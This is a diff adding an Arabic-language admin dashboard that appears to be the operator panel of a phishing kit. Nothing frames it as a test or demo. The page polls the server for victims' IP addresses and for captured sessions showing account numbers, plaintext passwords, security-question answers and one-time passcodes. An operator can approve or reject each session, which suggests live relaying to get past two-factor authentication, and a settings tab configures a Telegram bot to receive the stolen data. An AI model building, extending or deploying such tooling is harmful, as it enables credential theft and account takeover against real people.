@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة التحكم</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Arial, sans-serif; }
+        body { background: #f0f2f5; color: #333; min-height: 100vh; }
+
+        .admin-header {
+            background: #fff; padding: 16px 30px; box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            display: flex; justify-content: space-between; align-items: center;
+            position: sticky; top: 0; z-index: 1000;
+        }
+        .admin-header h1 { font-size: 22px; color: #1a1a1a; font-weight: 700; }
+        .header-actions { display: flex; align-items: center; gap: 12px; }
+        .logout-btn {
+            background: #dc3545; color: #fff; border: none; padding: 8px 18px;
+            border-radius: 6px; font-size: 14px; cursor: pointer; text-decoration: none;
+        }
+        .logout-btn:hover { background: #c82333; }
+        .refresh-btn {
+            background: #f5f5f5; border: 1px solid #e0e0e0; padding: 8px 18px;
+            border-radius: 6px; font-size: 13px; cursor: pointer;
+        }
+        .refresh-btn:hover { background: #e8e8e8; }
+
+        .admin-container { max-width: 1400px; margin: 20px auto; padding: 0 20px; }
+
+        .active-visits-section {
+            background: #fff; border-radius: 12px; padding: 22px 25px;
+            margin-bottom: 20px; box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+        }
+        .section-title {
+            font-size: 18px; font-weight: 700; color: #1a1a1a; margin-bottom: 15px;
+            display: flex; align-items: center; gap: 12px;
+        }
+        .wifi-icon {
+            display: inline-flex; align-items: center; justify-content: center;
+            width: 38px; height: 38px; background: linear-gradient(135deg, #00c853, #69f0ae);
+            border-radius: 50%; color: white;
+        }
+        .wifi-icon svg { width: 20px; height: 20px; }
+        .visit-count-badge {
+            background: #e8f5e9; color: #2e7d32; padding: 3px 12px;
+            border-radius: 20px; font-size: 13px; font-weight: 600;
+        }
+        .visits-grid {
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+            gap: 12px; max-height: 220px; overflow-y: auto;
+        }
+        .visit-card {
+            background: #f8f9fa; border: 1px solid #e0e0e0; border-radius: 8px;
+            padding: 14px 16px; display: flex; align-items: center; gap: 12px;
+        }
+        .visit-dot {
+            width: 10px; height: 10px; background: #00c853; border-radius: 50%;
+            animation: pulse 2s infinite; flex-shrink: 0;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.8); }
+        }
+        .visit-info { flex: 1; }
+        .visit-ip { font-size: 14px; font-weight: 600; color: #333; direction: ltr; }
+        .visit-ua { font-size: 11px; color: #999; }
+
+        .stats-row { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 15px; margin-bottom: 20px; }
+        .stat-card {
+            background: #fff; border-radius: 12px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.06);
+            text-align: center;
+        }
+        .stat-number { font-size: 32px; font-weight: 700; }
+        .stat-label { font-size: 13px; color: #888; margin-top: 5px; }
+        .stat-sessions { color: #6a1b9a; }
+        .stat-login { color: #1565c0; }
+        .stat-security { color: #e65100; }
+        .stat-otp { color: #c62828; }
+
+        .tabs { display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap; }
+        .tab-btn {
+            padding: 10px 22px; border: 1px solid #ddd; background: #fff; border-radius: 8px;
+            font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.2s;
+        }
+        .tab-btn.active { background: #1565c0; color: #fff; border-color: #1565c0; }
+        .tab-btn:hover:not(.active) { background: #f5f5f5; }
+        .clear-btn {
+            background: #fff; border: 1px solid #dc3545; color: #dc3545; padding: 10px 22px;
+            border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer;
+        }
+        .clear-btn:hover { background: #ffebee; }
+
+        .sessions-grid {
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
+            gap: 18px;
+        }
+        .session-card {
+            background: #fff; border-radius: 14px; overflow: hidden;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.07); border: 1px solid #e8e8e8;
+            transition: box-shadow 0.2s;
+        }
+        .session-card:hover { box-shadow: 0 4px 20px rgba(0,0,0,0.12); }
+        .session-card.status-approved-card { border-right: 4px solid #2e7d32; }
+        .session-card.status-rejected-card { border-right: 4px solid #c62828; }
+        .session-card.status-pending-card { border-right: 4px solid #e65100; }
+
+        .session-header {
+            padding: 16px 20px; background: #f8f9fa; border-bottom: 1px solid #e8e8e8;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .session-header-right { display: flex; align-items: center; gap: 10px; }
+        .session-account {
+            font-size: 20px; font-weight: 700; font-family: 'Courier New', monospace;
+            direction: ltr; display: inline-block; color: #1565c0;
+        }
+        .session-time { font-size: 12px; color: #888; }
+        .session-step-count {
+            font-size: 11px; background: #e3f2fd; color: #1565c0; padding: 2px 8px;
+            border-radius: 10px; font-weight: 600;
+        }
+
+        .status-badge { display: inline-block; padding: 3px 10px; border-radius: 12px; font-size: 12px; font-weight: 600; }
+        .status-pending { background: #fff3e0; color: #e65100; }
+        .status-approved { background: #e8f5e9; color: #2e7d32; }
+        .status-rejected { background: #ffebee; color: #c62828; }
+
+        .session-steps { padding: 0; }
+        .session-step {
+            padding: 14px 20px; border-bottom: 1px solid #f0f0f0;
+            display: flex; align-items: flex-start; gap: 14px;
+        }
+        .session-step:last-child { border-bottom: none; }
+        .step-indicator {
+            width: 36px; height: 36px; border-radius: 50%; display: flex;
+            align-items: center; justify-content: center; font-size: 16px;
+            flex-shrink: 0; color: #fff; font-weight: 700;
+        }
+        .step-login .step-indicator { background: #1565c0; }
+        .step-security .step-indicator { background: #e65100; }
+        .step-otp .step-indicator { background: #c62828; }
+        .step-content { flex: 1; min-width: 0; }
+        .step-type-label { font-size: 12px; font-weight: 600; color: #888; margin-bottom: 4px; }
+        .step-main-value {
+            font-family: 'Courier New', monospace; color: #c62828; font-weight: 700;
+            font-size: 17px; direction: ltr; display: inline-block; word-break: break-all;
+        }
+        .step-sub-label { font-size: 13px; color: #555; margin-bottom: 2px; }
+        .step-otp .step-main-value {
+            font-size: 24px; background: #fff3e0; padding: 4px 14px; border-radius: 6px;
+            border: 2px solid #e65100;
+        }
+
+        .session-actions {
+            padding: 14px 20px; display: flex; gap: 8px; justify-content: center;
+            background: #fafafa; border-top: 1px solid #e8e8e8;
+        }
+        .action-btn {
+            padding: 8px 20px; border: none; border-radius: 8px;
+            font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.2s;
+        }
+        .btn-approve { background: #e8f5e9; color: #2e7d32; }
+        .btn-approve:hover { background: #c8e6c9; }
+        .btn-reject { background: #ffebee; color: #c62828; }
+        .btn-reject:hover { background: #ffcdd2; }
+        .btn-delete { background: #f5f5f5; color: #888; }
+        .btn-delete:hover { background: #e0e0e0; color: #c62828; }
+
+        .empty-state { text-align: center; padding: 50px 20px; color: #999; }
+        .empty-state p { font-size: 16px; }
+
+        .settings-section { display: none; }
+        .settings-section.active { display: block; }
+        .section {
+            background: #fff; border-radius: 12px; padding: 22px 25px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.06); margin-bottom: 20px;
+        }
+        .form-row { margin-bottom: 16px; }
+        .form-row label { display: block; font-size: 14px; font-weight: 600; color: #555; margin-bottom: 6px; }
+        .form-row input {
+            width: 100%; padding: 10px 14px; border: 1px solid #ddd; border-radius: 8px;
+            font-size: 14px; direction: ltr; outline: none;
+        }
+        .form-row input:focus { border-color: #1565c0; }
+        .save-btn {
+            background: #1565c0; color: #fff; border: none; padding: 10px 24px;
+            border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer;
+        }
+        .save-btn:hover { background: #0d47a1; }
+        .test-btn {
+            background: #2e7d32; color: #fff; border: none; padding: 10px 24px;
+            border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; margin-right: 10px;
+        }
+        .test-btn:hover { background: #1b5e20; }
+
+        @media (max-width: 768px) {
+            .admin-header { padding: 12px 15px; }
+            .admin-header h1 { font-size: 17px; }
+            .admin-container { padding: 0 10px; margin: 15px auto; }
+            .sessions-grid { grid-template-columns: 1fr; }
+            .stats-row { grid-template-columns: repeat(2, 1fr); }
+            .visits-grid { grid-template-columns: 1fr; }
+            .session-header { flex-direction: column; align-items: flex-start; gap: 8px; }
+            .action-btn { padding: 7px 14px; font-size: 13px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="admin-header">
+        <h1>لوحة التحكم</h1>
+        <div class="header-actions">
+            <button class="refresh-btn" onclick="loadAll()">تحديث</button>
+            <a href="/admin/logout" class="logout-btn">تسجيل الخروج</a>
+        </div>
+    </header>
+
+    <div class="admin-container">
+
+        <div class="active-visits-section">
+            <div class="section-title">
+                <span class="wifi-icon">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M5 12.55a11 11 0 0 1 14.08 0"/>
+                        <path d="M1.42 9a16 16 0 0 1 21.16 0"/>
+                        <path d="M8.53 16.11a6 6 0 0 1 6.95 0"/>
+                        <line x1="12" y1="20" x2="12.01" y2="20"/>
+                    </svg>
+                </span>
+                الزيارات النشطة
+                <span class="visit-count-badge" id="visitCount">0</span>
+            </div>
+            <div class="visits-grid" id="visitsGrid">
+                <div class="empty-state"><p>لا توجد زيارات نشطة حالياً</p></div>
+            </div>
+        </div>
+
+        <div class="stats-row">
+            <div class="stat-card">
+                <div class="stat-number stat-sessions" id="countSessions">0</div>
+                <div class="stat-label">جلسات</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number stat-login" id="countLogin">0</div>
+                <div class="stat-label">تسجيلات دخول</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number stat-security" id="countSecurity">0</div>
+                <div class="stat-label">أسئلة أمان</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number stat-otp" id="countOtp">0</div>
+                <div class="stat-label">رموز OTP</div>
+            </div>
+        </div>
+
+        <div class="tabs">
+            <button class="tab-btn active" onclick="switchTab('sessions', this)">الجلسات</button>
+            <button class="tab-btn" onclick="switchTab('settings', this)">إعدادات البوت</button>
+            <button class="clear-btn" onclick="clearAll()">مسح الكل</button>
+        </div>
+
+        <div id="sessionsSection">
+            <div class="sessions-grid" id="sessionsGrid">
+                <div class="empty-state"><p>لا توجد جلسات</p></div>
+            </div>
+        </div>
+
+        <div class="section settings-section" id="settingsSection">
+            <div class="section-title">إعدادات بوت تلجرام</div>
+            <div class="form-row">
+                <label>Bot Token</label>
+                <input type="text" id="botToken" placeholder="أدخل توكن البوت">
+            </div>
+            <div class="form-row">
+                <label>Chat ID</label>
+                <input type="text" id="chatId" placeholder="أدخل معرف المحادثة">
+            </div>
+            <div style="display: flex; gap: 10px; margin-top: 20px;">
+                <button class="save-btn" onclick="saveSettings()">حفظ الإعدادات</button>
+                <button class="test-btn" onclick="testBot()">اختبار البوت</button>
+            </div>
+            <p id="settingsMsg" style="margin-top: 12px; font-size: 13px;"></p>
+        </div>
+    </div>
+
+    <script>
+        var allSessions = [];
+
+        function loadAll() { loadVisits(); loadSessions(); }
+
+        async function loadVisits() {
+            try {
+                var res = await fetch('/admin/api/active-visits');
+                if (res.status === 401) return;
+                var json = await res.json();
+                if (json.ok) {
+                    document.getElementById('visitCount').textContent = json.count || 0;
+                    var grid = document.getElementById('visitsGrid');
+                    if (!json.visitors || json.visitors.length === 0) {
+                        grid.innerHTML = '<div class="empty-state"><p>لا توجد زيارات نشطة حالياً</p></div>';
+                    } else {
+                        grid.innerHTML = json.visitors.map(function(v) {
+                            return '<div class="visit-card">' +
+                                '<div class="visit-dot"></div>' +
+                                '<div class="visit-info">' +
+                                    '<div class="visit-ip">' + esc(v.ip) + '</div>' +
+                                    '<div class="visit-ua">' + esc(v.ua || '') + '</div>' +
+                                '</div>' +
+                            '</div>';
+                        }).join('');
+                    }
+                }
+            } catch (e) { console.error(e); }
+        }
+
+        async function loadSessions() {
+            try {
+                var res = await fetch('/admin/api/sessions');
+                if (res.status === 401) { window.location.href = '/admin-login'; return; }
+                var json = await res.json();
+                if (json.ok) {
+                    allSessions = json.sessions || [];
+                    updateStats();
+                    renderSessions();
+                }
+            } catch (e) { console.error(e); }
+        }
+
+        function updateStats() {
+            document.getElementById('countSessions').textContent = allSessions.length;
+            var loginCount = 0, secCount = 0, otpCount = 0;
+            allSessions.forEach(function(sess) {
+                sess.steps.forEach(function(s) {
+                    if (s.type === 'login') loginCount++;
+                    else if (s.type === 'security') secCount++;
+                    else if (s.type === 'otp') otpCount++;
+                });
+            });
+            document.getElementById('countLogin').textContent = loginCount;
+            document.getElementById('countSecurity').textContent = secCount;
+            document.getElementById('countOtp').textContent = otpCount;
+        }
+
+        function switchTab(tab, btn) {
+            document.querySelectorAll('.tab-btn').forEach(function(b) { b.classList.remove('active'); });
+            btn.classList.add('active');
+            if (tab === 'settings') {
+                document.getElementById('sessionsSection').style.display = 'none';
+                document.getElementById('settingsSection').classList.add('active');
+                loadSettingsForm();
+            } else {
+                document.getElementById('sessionsSection').style.display = '';
+                document.getElementById('settingsSection').classList.remove('active');
+            }
+        }
+
+        function esc(str) {
+            if (!str) return '';
+            return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+        }
+
+        function renderSessions() {
+            var grid = document.getElementById('sessionsGrid');
+            if (!allSessions.length) {
+                grid.innerHTML = '<div class="empty-state"><p>لا توجد جلسات</p></div>';
+                return;
+            }
+            grid.innerHTML = allSessions.map(function(sess) {
+                var statusClass = 'status-pending-card';
+                var statusBadge = '<span class="status-badge status-pending">بانتظار</span>';
+                if (sess.status === 'approved') {
+                    statusClass = 'status-approved-card';
+                    statusBadge = '<span class="status-badge status-approved">مقبول</span>';
+                } else if (sess.status === 'rejected') {
+                    statusClass = 'status-rejected-card';
+                    statusBadge = '<span class="status-badge status-rejected">مرفوض</span>';
+                }
+
+                var time = sess.time ? new Date(sess.time).toLocaleString('ar-EG') : '-';
+                var sid = esc(sess.session_id);
+
+                var stepsHtml = '';
+                var typeOrder = ['login', 'security', 'otp'];
+                var sortedSteps = sess.steps.slice().sort(function(a, b) {
+                    return typeOrder.indexOf(a.type) - typeOrder.indexOf(b.type);
+                });
+
+                sortedSteps.forEach(function(s) {
+                    var d = s.data || {};
+                    if (s.type === 'login') {
+                        stepsHtml += '<div class="session-step step-login">' +
+                            '<div class="step-indicator">1</div>' +
+                            '<div class="step-content">' +
+                                '<div class="step-type-label">تسجيل دخول</div>' +
+                                '<div class="step-main-value">' + esc(d.password) + '</div>' +
+                            '</div></div>';
+                    } else if (s.type === 'security') {
+                        stepsHtml += '<div class="session-step step-security">' +
+                            '<div class="step-indicator">2</div>' +
+                            '<div class="step-content">' +
+                                '<div class="step-type-label">سؤال أمان</div>' +
+                                '<div class="step-sub-label">' + esc(d.question) + '</div>' +
+                                '<div class="step-main-value">' + esc(d.answer) + '</div>' +
+                            '</div></div>';
+                    } else if (s.type === 'otp') {
+                        var code = d.code || d.otp || d.otp_code || '';
+                        stepsHtml += '<div class="session-step step-otp">' +
+                            '<div class="step-indicator">3</div>' +
+                            '<div class="step-content">' +
+                                '<div class="step-type-label">رمز OTP</div>' +
+                                '<div class="step-main-value">' + esc(code) + '</div>' +
+                            '</div></div>';
+                    }
+                });
+
+                var actionsHtml = '';
+                if (sess.status === 'pending') {
+                    actionsHtml = '<button class="action-btn btn-approve" onclick="approveSession(\'' + sid + '\')">قبول</button>' +
+                        '<button class="action-btn btn-reject" onclick="rejectSession(\'' + sid + '\')">رفض</button>';
+                }
+                actionsHtml += '<button class="action-btn btn-delete" onclick="deleteSession(\'' + sid + '\')">حذف</button>';
+
+                return '<div class="session-card ' + statusClass + '">' +
+                    '<div class="session-header">' +
+                        '<div class="session-header-right">' +
+                            '<span class="session-account">' + esc(sess.account || '-') + '</span>' +
+                            statusBadge +
+                            '<span class="session-step-count">' + sess.steps.length + ' خطوات</span>' +
+                        '</div>' +
+                        '<span class="session-time">' + time + '</span>' +
+                    '</div>' +
+                    '<div class="session-steps">' + stepsHtml + '</div>' +
+                    '<div class="session-actions">' + actionsHtml + '</div>' +
+                '</div>';
+            }).join('');
+        }
+
+        async function approveSession(sessionId) {
+            try {
+                await fetch('/admin/api/approve-session', {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ session_id: sessionId })
+                });
+                var sess = allSessions.find(function(s) { return s.session_id === sessionId; });
+                if (sess) {
+                    sess.status = 'approved';
+                    sess.steps.forEach(function(s) { s.status = 'approved'; });
+                }
+                renderSessions();
+            } catch (e) { console.error(e); }
+        }
+
+        async function rejectSession(sessionId) {
+            try {
+                await fetch('/admin/api/reject-session', {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ session_id: sessionId })
+                });
+                var sess = allSessions.find(function(s) { return s.session_id === sessionId; });
+                if (sess) {
+                    sess.status = 'rejected';
+                    sess.steps.forEach(function(s) { s.status = 'rejected'; });
+                }
+                renderSessions();
+            } catch (e) { console.error(e); }
+        }
+
+        async function deleteSession(sessionId) {
+            try {
+                await fetch('/admin/api/delete-session', {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ session_id: sessionId })
+                });
+                allSessions = allSessions.filter(function(s) { return s.session_id !== sessionId; });
+                updateStats();
+                renderSessions();
+            } catch (e) { console.error(e); }
+        }
+
+        async function clearAll() {
+            if (!confirm('هل أنت متأكد من مسح جميع البيانات؟')) return;
+            try {
+                await fetch('/admin/api/clear', { method: 'POST' });
+                allSessions = [];
+                updateStats();
+                renderSessions();
+            } catch (e) { console.error(e); }
+        }
+
+        async function loadSettingsForm() {
+            try {
+                var res = await fetch('/admin/api/settings');
+                var json = await res.json();
+                if (json.ok) {
+                    document.getElementById('botToken').value = json.bot_token || '';
+                    document.getElementById('chatId').value = json.chat_id || '';
+                }
+            } catch (e) {}
+        }
+
+        async function saveSettings() {
+            var msgEl = document.getElementById('settingsMsg');
+            try {
+                var res = await fetch('/admin/api/settings', {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ bot_token: document.getElementById('botToken').value, chat_id: document.getElementById('chatId').value })
+                });
+                var json = await res.json();
+                msgEl.style.color = json.ok ? '#2e7d32' : '#c62828';
+                msgEl.textContent = json.ok ? 'تم حفظ الإعدادات بنجاح' : 'خطأ في الحفظ';
+            } catch (e) { msgEl.style.color = '#c62828'; msgEl.textContent = 'خطأ في الاتصال'; }
+        }
+
+        async function testBot() {
+            var msgEl = document.getElementById('settingsMsg');
+            msgEl.style.color = '#1565c0'; msgEl.textContent = 'جارٍ الاختبار...';
+            try {
+                var res = await fetch('/admin/api/test-bot', { method: 'POST' });
+                var json = await res.json();
+                msgEl.style.color = json.ok ? '#2e7d32' : '#c62828';
+                msgEl.textContent = json.ok ? 'تم إرسال رسالة الاختبار بنجاح' : (json.error || 'فشل الإرسال');
+            } catch (e) { msgEl.style.color = '#c62828'; msgEl.textContent = 'خطأ في الاتصال'; }
+        }
+
+        setInterval(loadAll, 3000);
+        loadAll();
+    </script>
+
+</body>
+</html>
